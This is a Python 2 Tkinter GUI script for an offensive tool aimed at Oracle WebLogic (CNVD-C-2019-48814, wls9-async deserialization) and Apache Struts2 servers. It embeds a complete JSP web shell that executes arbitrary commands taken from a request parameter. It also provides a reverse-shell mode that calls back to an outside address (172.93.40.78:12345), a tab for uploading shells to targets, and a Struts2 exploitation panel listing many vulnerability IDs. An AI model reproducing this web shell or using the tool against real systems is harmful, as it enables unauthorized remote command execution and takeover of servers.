# -*- coding: UTF-8 -*-
import Tkinter as tk
import ttk
import threading

from Tkinter import Menu
from Tkinter import Spinbox
import tkMessageBox as mBox
import weblogic as wl
import weblogicwin as wlw
import scan as sc
import wls as ws
import wlscmd as wd


#由于tkinter中没有ToolTip功能，所以自定义这个功能如下
class ToolTip(object):
    def __init__(self, widget):
        self.widget = widget
        self.tipwindow = None
        self.id = None
        self.x = self.y = 0

    def showtip(self, text):
        "Display text in tooltip window"
        self.text = text
        if self.tipwindow or not self.text:
            return
        x, y, _cx, cy = self.widget.bbox("insert")
        x = x + self.widget.winfo_rootx() + 27
        y = y + cy + self.widget.winfo_rooty() +27
        self.tipwindow = tw = tk.Toplevel(self.widget)
        tw.wm_overrideredirect(1)
        tw.wm_geometry("+%d+%d" % (x, y))

        label = tk.Label(tw, text=self.text, justify=tk.LEFT,
                      background="#ffffe0", relief=tk.SOLID, borderwidth=1,
                      font=("tahoma", "8", "normal"))
        label.pack(ipadx=1)

    def hidetip(self):
        tw = self.tipwindow
        self.tipwindow = None
        if tw:
            tw.destroy()

exeploit ='''<%@ page import="java.io.*" %>
<%@ page import="java.lang.System" %>
<%@ page import="java.lang.Process" %>
<%@page import="java.io.BufferedReader"%>
<%@page import="java.io.InputStreamReader"%>
<%@page language="java" import="java.util.*" pageEncoding="UTF-8"%>
<%!
String Execute(String cmd){
	StringBuffer sb=new StringBuffer("");
	try{
		Process child;
		if(System.getProperty("os.name").toLowerCase().startsWith("win")){  
			child = Runtime.getRuntime().exec(new String[]{"cmd.exe","/c",cmd});  
		}else{
			child = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});  
		}
		BufferedReader br = new BufferedReader(new InputStreamReader(child.getInputStream()));  
        String line;  
        while ((line = br.readLine()) != null) {  '''

exeploit+="sb.append(line).append(\"\\n\");\n"\
	 " }\n"
exeploit+= ''' try {
			child.waitFor();
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
	} catch (IOException e) {
		System.err.println(e);  
	}	
	return sb.toString();
}
%>
<%
String cmd = request.getParameter("c");
//do execute cmd
if(cmd != null){
	out.print(Execute(cmd));	
}'''


caidao = '''call me maybe'''
#===================================================================

def cmd(target,cmd,output_file='xxx.jsp',os='linux', shell_file='exec.jsp'):
    if os == 'linux':
        wl.proxies =None
        return wl.weblogic_rce(target,cmd,output_file,'linux')
    else:
        print 'win'
        wlw.proxies = None
        return wlw.weblogic_rce(target, cmd,output_file, shell_file)


def createToolTip( widget, text):
    toolTip = ToolTip(widget)
    def enter(event):
        toolTip.showtip(text)
    def leave(event):
        toolTip.hidetip()
    widget.bind('<Enter>', enter)
    widget.bind('<Leave>', leave)

# Create instance
win = tk.Tk()

# Add a title
win.title("CNVD-C-2019-48814 powered by bigsizeme")

# Disable resizing the GUI
win.resizable(1,1)


win.geometry('960x580')
urlFrame = ttk.Frame(win)

urlFrame.pack(expand=0, fill='both')



urlLabel = ttk.Label(urlFrame, width=4, text='地 址: ')
#urlLabel.pack(side='left', padx=30.0, anchor='e')
urlLabel.grid(row=0, column=0, padx=5)
urlString = tk.StringVar()
urlString.set('http://192.168.144.131:7001')
urlEntry = ttk.Entry(urlFrame, width=30, textvariable=urlString, text='192.168.144.24:7001')
#urlEntry.pack(side='left', padx=10.0, anchor='e')
urlEntry.grid(row=0, column=1)


#urlButton = ttk.Button(urlFrame, width=4, text='执 行', command=main)
#urlButton.grid(row=0, column=2, padx=5)
# Tab Control introduced here --------------------------------------
tabControl = ttk.Notebook(win)          # Create Tab Control

tabCmd = ttk.Frame(tabControl)
# tabControl.add(tabCmd, text='wb命令执行')      # Add the tab

tabUpload = ttk.Frame(tabControl)  #文件上次页签
# tabControl.add(tabUpload,text='wb文件上传')

tabPatch = ttk.Frame(tabControl)
# tabControl.add(tabPatch, text='Struts2批量检测')      # Add the tab

tabStrutsCmd = ttk.Frame(tabControl)  #文件上次页签
# tabControl.add(tabStrutsCmd,text='Sruts2命令执行')

tabWlsCmd = ttk.Frame(tabControl)  #文件上次页签
tabControl.add(tabWlsCmd,text='weblogic-aynsc命令执行')



# tab1 = ttk.Frame(tabControl)            # Create a tab
# tabControl.add(tab1, text='第一页 ')      # Add the tab
#
# tab2 = ttk.Frame(tabControl)            # Add a second tab
# tabControl.add(tab2, text='第二页 ')      # Make second tab visible
#
# tab3 = ttk.Frame(tabControl)            # Add a third tab
# tabControl.add(tab3, text='第三页 ')      # Make second tab visible

tabControl.pack(expand=1, fill="both",padx=4,pady=5)  # Pack to make visible
# ~ Tab Control introduced here -----------------------------------------e

cmdDisplay = ttk.LabelFrame(tabCmd, text='命令回显区')
# cmdDisplay.grid(row=0,column=2,rowspan=2,columnspan=2, padx=8, pady=4,ipadx=120,ipady=70)

cmdDisplay.grid(row=2,column=4,rowspan=2,columnspan=2, padx=8, pady=4,ipadx=120,ipady=70)

#ttk.Label(cmdDisplay, text="输入文字:").grid(column=0, row=0, sticky='W')
cmdLabel = ttk.Label(cmdDisplay, text="CMD:", width=5)
cmdLabel.grid(column=0, row=0, sticky='W')


cmdString = tk.StringVar()
cmdEntry = ttk.Entry(cmdDisplay, width=30, text='whoami', textvariable=cmdString)
#urlEntry.pack(side='left', padx=10.0, anchor='e')
cmdEntry.grid(row=0, column=1, sticky='W', padx=10)

#调用命令执行函数
aa = ('','')


#
text = tk.Text(cmdDisplay,padx=5,pady=2,width=80, height=20)
text.grid(column=0, row=1, sticky='W', columnspan=7)
# text.insert(tk.INSERT, 'I Love\n')

def execCmd():
    target = urlString.get()
    print target
    comm = cmdString.get()
    print comm

    status, result = cmd(target,comm,os='win')


    if not status:    # linux  情况下在区执行一次命
        status, result = cmd(target,comm)
    text.delete(0.0,tk.END)
    text.insert(tk.INSERT, result)


cmdButton = ttk.Button(cmdDisplay, text='执行', width=5, command=execCmd)
cmdButton.grid(row=0, column=2, sticky='E')


#--------------文件上传-----------------------#
#creating a container uploadt tab  hold  fileName (Entity,Text,Button,Label)

uploadDisplay = ttk.LabelFrame(tabUpload, text='文件上传')
uploadDisplay.grid(column=0, row=0, padx=8, pady=4)

#ttk.Label(cmdDisplay, text="输入文字:").grid(column=0, row=0, sticky='W')
fileLabel = ttk.Label(uploadDisplay, text="文件名称: ", width=10)
fileLabel.grid(column=0, row=0, sticky='W')


fileString = tk.StringVar()
fileEntry = ttk.Entry(uploadDisplay, width=30, textvariable=fileString, text='axtx.jsp')
#urlEntry.pack(side='left', padx=10.0, anchor='e')
fileEntry.grid(row=0, column=1, sticky='W', padx=15)


fileText = tk.Text(uploadDisplay,padx=5,pady=2,width=80, height=20)
fileText.grid(column=0, row=1, sticky='W', columnspan=7)
fileText.insert(tk.INSERT,caidao)

def upload():

    target = urlString.get()
    print target
    fileName = fileString.get()
    print fileName
    shell = fileText.get(tk.INSERT,tk.END)
    print shell
    wlw.proxies = None
    wlw.weblogic_rce2(target,fileName,caidao)


fileButton = ttk.Button(uploadDisplay, text='执行', width=5, command=upload)
fileButton.grid(row=0, column=2, sticky='W')

#---------------Struts2批量检测------------------#
patchInfo = ttk.LabelFrame(tabPatch, text='命令回显区')
patchInfo.grid(column=0, row=0, padx=8, pady=4)

#ttk.Label(cmdDisplay, text="输入文字:").grid(column=0, row=0, sticky='W')
#patchLabel = ttk.Label(patchInfo, text="CMD:", width=5)
#patchLabel.grid(column=0, row=0, sticky='W')


patchString = tk.StringVar()
#pathcEntry = ttk.Entry(patchInfo, width=10, text='whoami', textvariable=patchString)
#urlEntry.pack(side='left', padx=10.0, anchor='e')
#pathcEntry.grid(row=0, column=1, sticky='W', padx=15)

book = tk.StringVar()
#bookChosen = ttk.Combobox(patchInfo, width=12, textvariable=book)
#bookChosen['values'] = ('平凡的世界', '亲爱的安德烈','看见','白夜行')
#bookChosen.grid(row=0, column=1, sticky='W', padx=15)
#bookChosen.current(1)  #设置初始显示值，值为元组['values']的下标
#bookChosen.config(state='readonly')  #设为只读模式

patchText = tk.Text(patchInfo,padx=5,pady=2,width=80, height=20)
patchText.grid(column=0, row=1, sticky='W', columnspan=7)
# text.insert(tk.INSERT, 'I Love\n')

def execPatch():
    target = urlString.get()
    print target
    comm = cmdString.get()
    print comm
    strutsVuln = sc.struts_baseverify(target)
    str = strutsVuln.scanGui()
    patchText.delete(0.0,tk.END)
    patchText.insert(tk.INSERT, str)


pathcButton = ttk.Button(patchInfo, text='执行', width=10, command=execPatch)
pathcButton.grid(row=0, column=6, sticky='W')

#---------------struts2命令执行------------------#

strustCmdInfo = ttk.LabelFrame(tabStrutsCmd, text='命令回显区')
strustCmdInfo.grid(column=0, row=0, padx=8, pady=4)

#ttk.Label(cmdDisplay, text="输入文字:").grid(column=0, row=0, sticky='W')
strutsCmdLabel = ttk.Label(strustCmdInfo, text="CMD:", width=5)
strutsCmdLabel.grid(column=0, row=0, sticky='W')


strutsCmdString = tk.StringVar()
strutsCmdEntry = ttk.Entry(strustCmdInfo, width=30, text='whoami', textvariable=strutsCmdString)
strutsCmdEntry.pack(side='left', padx=10.0, anchor='e')
strutsCmdEntry.grid(row=0, column=1, sticky='W', padx=15)

bookStr = tk.StringVar()
bookChosen = ttk.Combobox(strustCmdInfo, width=12, textvariable=bookStr)
bookChosen['values'] = ('struts2-005', 'struts2-009','struts2-013','struts2-016','struts2-019','struts2-devmode','struts2-032','struts2-033','struts2-037','struts2-045','struts2-048','struts2-053')
bookChosen.grid(row=0, column=2, sticky='W', padx=15)
bookChosen.current(1)  #设置初始显示值，值为元组['values']的下标
bookChosen.config(state='readonly')  #设为只读模式

strutsCmdText = tk.Text(strustCmdInfo, padx=5,pady=2,width=80, height=20)
strutsCmdText.grid(column=0, row=1, sticky='W', columnspan=7)
# text.insert(tk.INSERT, 'I Love\n')

def execstrustCmd():
    target = urlString.get()
    print target
    comm = strutsCmdString.get()
    print comm
    type = bookStr.get()
    print comm
    strutsVuln = sc.struts_baseverify(target)
    str = strutsVuln.inShellByGui(type,comm)
    strutsCmdText.delete(0.0,tk.END)
    strutsCmdText.insert(tk.INSERT, str)


strustCmdButton = ttk.Button(strustCmdInfo, text='执行', width=5, command=execstrustCmd)
strustCmdButton.grid(row=0, column=3, sticky='W')




#---------------WebLogic wls9-async反序列化命令执行------------------#

wlsCmdInfo = ttk.LabelFrame(tabWlsCmd, text='命令回显区')
# wlsCmdInfo.grid(column=0, row=0, padx=16, pady=8)
wlsCmdInfo.grid(row=2,column=4,rowspan=2,columnspan=2, padx=8, pady=4,ipadx=120,ipady=70)

#ttk.Label(cmdDisplay, text="输入文字:").grid(column=0, row=0, sticky='W')
wlsCmdLabel = ttk.Label(wlsCmdInfo, text="命令：", width=5)
wlsCmdLabel.grid(column=0, row=0, sticky='W')


wlsCmdString = tk.StringVar()
wlsCmdEntry = ttk.Entry(wlsCmdInfo, width=30, text='whoami', textvariable=wlsCmdString)
wlsCmdEntry.pack(side='left', padx=10.0, anchor='e')
wlsCmdEntry.grid(row=0, column=1, sticky='W', padx=15)

wlsReboundLabel = ttk.Label(wlsCmdInfo, text="反弹地址及端口:", width=13)
wlsReboundLabel.grid(column=2, row=0, sticky='W')

wlsReboundString = tk.StringVar()
wlsReboundEntry = ttk.Entry(wlsCmdInfo, width=30, text='172.93.40.78:12345', textvariable=wlsReboundString)
wlsReboundEntry.pack(side='left', padx=10.0, anchor='e')
wlsReboundEntry.grid(row=0, column=3, sticky='W', padx=15)


wlsModelLabel = ttk.Label(wlsCmdInfo, text="模式:", width=12)
wlsModelLabel.grid(column=4, row=0, sticky='W')

bookWlsStr = tk.StringVar()
bookWlsChosen = ttk.Combobox(wlsCmdInfo, width=12, textvariable=bookWlsStr)
bookWlsChosen['values'] = ('反弹', '写文件')
bookWlsChosen.grid(row=0, column=5, sticky='W', padx=15)
bookWlsChosen.current(1)  #设置初始显示值，值为元组['values']的下标
bookWlsChosen.config(state='readonly')  #设为只读模式

wlsCmdText = tk.Text(wlsCmdInfo, padx=5,pady=2,width=120, height=30)
wlsCmdText.grid(column=0, row=1, sticky='W', columnspan=7)
# text.insert(tk.INSERT, 'I Love\n')

def execWlsCmd():
    target = urlString.get()
    print target
    comm = wlsCmdString.get()
    print comm
    type = bookWlsStr.get()
    print type

    rebound =  wlsReboundString.get()
    print  rebound

    # strutsVuln = sc.struts_baseverify(target)
    # str = strutsVuln.inShellByGui(type,comm)
    if type =='反弹':
        sss = wlsReboundString.get().split(':')

        exploit =ws.Exploit(
            check=None, rhost=urlString.get(), lhost=sss[0], lport=sss[1],
            windows=None)
        exploit.run()
        wlsCmdText.delete(0.0,tk.END)
        wlsCmdText.insert(tk.INSERT, '请检查反弹窗口！')
    else:
        wlsCmdText.delete(0.0,tk.END)
        wlsCmdText.insert(tk.INSERT, '请稍等')
        wlsCmdButton.config(state=tk.DISABLED)
        exploit = wd.Exploit(rhost=urlString.get(),windows=None,cmd=wlsCmdString.get())
        sss = exploit.run()
        wlsCmdText.delete(0.0,tk.END)
        wlsCmdText.insert(tk.INSERT, sss)
        wlsCmdButton.config(state=tk.ACTIVE)
def theadnew():
        th=threading.Thread(target=execWlsCmd)
        th.setDaemon(True)#守护线程
        th.start()

wlsCmdButton = ttk.Button(wlsCmdInfo, text='执行', width=5, command=theadnew)

wlsCmdButton.grid(row=0, column=6, sticky='W')


#---------------Tab2控件介绍------------------#

#---------------Tab2控件介绍------------------#


#---------------Tab3控件介绍------------------#

#---------------Tab3控件介绍------------------#


#----------------菜单栏介绍-------------------#
# Exit GUI cleanly
def _quit():
    win.quit()
    win.destroy()
    exit()

# Creating a Menu Bar
menuBar = Menu(win)
win.config(menu=menuBar)

# Add menu items
fileMenu = Menu(menuBar, tearoff=0)
fileMenu.add_command(label="新建")
fileMenu.add_separator()
fileMenu.add_command(label="退出", command=_quit)
menuBar.add_cascade(label="文件", menu=fileMenu)


# Display a Message Box
def _msgBox1():
    mBox.showinfo('Python Message Info Box', '通知：程序运行正常！')
def _msgBox2():
    mBox.showwarning('Python Message Warning Box', '警告：程序出现错误，请检查！')
def _msgBox3():
    mBox.showwarning('Python Message Error Box', '错误：程序出现严重错误，请退出！')
def _msgBox4():
    answer = mBox.askyesno("Python Message Dual Choice Box", "你喜欢这篇文章吗？\n您的选择是：")
    if answer == True:
        mBox.showinfo('显示选择结果', '您选择了“是”，谢谢参与！')
    else:
        mBox.showinfo('显示选择结果', '您选择了“否”，谢谢参与！')

# Add another Menu to the Menu Bar and an item
msgMenu = Menu(menuBar, tearoff=0)
msgMenu.add_command(label="通知 Box", command=_msgBox1)
msgMenu.add_command(label="警告 Box", command=_msgBox2)
msgMenu.add_command(label="错误 Box", command=_msgBox3)
msgMenu.add_separator()
msgMenu.add_command(label="判断对话框", command=_msgBox4)
#menuBar.add_cascade(label="消息框", menu=msgMenu)
#----------------菜单栏介绍-------------------#


# Change the main windows icon
#win.iconbitmap(r'F:\pythonOO\strtus\timg.jpg')
#win.iconbitmap(r'mysj.ico')
#win.iconname('timg.jpg')

# Place cursor into name Entry
#
#======================
# Start GUI
#======================
win.mainloop()





